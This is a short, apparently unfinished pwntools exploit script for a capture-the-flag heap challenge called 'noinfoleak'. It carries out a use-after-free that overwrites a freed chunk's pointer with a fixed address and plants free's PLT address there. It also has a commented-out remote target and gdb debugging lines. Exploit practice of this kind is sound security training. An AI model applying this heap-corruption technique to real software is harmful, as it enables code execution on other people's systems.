from pwn import *

sh=process('./noinfoleak')
elf = ELF('./noinfoleak')
#sh=remote('111.198.29.45','32440')

def alloc(size,con):
	sh.sendlineafter('>','1')
	sh.sendlineafter('>',str(size))
	sh.sendlineafter('>',con)

def dele(idx):
	sh.sendlineafter('>','2')
	sh.sendlineafter('>',str(idx))

def fill(idx,con):
	sh.sendlineafter('>','3')
	sh.sendlineafter('>',str(idx))
	sh.sendlineafter('>',con)


alloc(0x30,'a')
alloc(0x20,'b')
dele(1)
fill(1,p64(0x6010a0))
alloc(0x20,'d')

pay = p64(elf.plt['free'])+str(8)
alloc(0x20,pay)

#fill(1,p64(elf.got['puts']))

#dele(0)

#print sh.recv()
gdb.attach(sh)
#fill(0,p64(0x6010a0))




#gdb.attach(sh)
sh.interactive()
